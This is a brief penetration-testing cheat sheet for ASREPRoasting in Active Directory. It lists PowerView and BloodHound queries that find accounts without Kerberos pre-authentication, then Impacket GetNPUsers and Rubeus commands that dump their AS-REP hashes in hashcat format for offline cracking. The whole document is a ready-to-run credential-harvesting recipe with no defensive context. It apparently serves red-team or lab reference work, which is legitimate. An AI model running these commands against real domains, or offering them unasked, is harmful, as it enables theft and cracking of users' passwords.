# ASREPRoast

## Tools: Rubeus , Impacket-GetNPUsers

### ASREPRoast

## Find ASREPRoastable users (need creds)

 - Get-DomainUser -PreauthNotRequired -Properties SamAccountName

 - MATCH(u:User {dontreqpreauth:true}). (c:Computer). p=shortestPath((u)-[*1..]->(c)) RETURN p (Bloodhound cypher query)

## Find ASREP hash

 - Impacket-GetNPUsers DOMAIN/ -usersfile USERNAMES.TXT -format hashcat -outputfile HASHES.DOMAIN.TXT

 - Rubeus.exe asreproast /format:hashcat


